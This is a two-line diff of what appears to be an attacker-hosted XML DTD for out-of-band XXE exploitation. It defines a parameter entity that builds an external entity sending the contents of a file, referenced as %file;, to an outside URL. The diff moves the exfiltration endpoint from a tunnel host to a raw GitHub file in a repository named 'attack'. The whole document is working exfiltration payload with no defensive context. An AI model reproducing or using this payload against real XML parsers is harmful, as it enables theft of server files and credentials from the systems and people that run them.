@@ -1,2 +1,2 @@
-<!ENTITY % payload "<!ENTITY send SYSTEM 'https://aa8a6fdc0ec742.lhr.life/out?data=%file;'>">
+<!ENTITY % payload "<!ENTITY send SYSTEM 'https://raw.githubusercontent.com/abdnourg3-dev/attack/main/out?data=%file;'>">
 %payload;
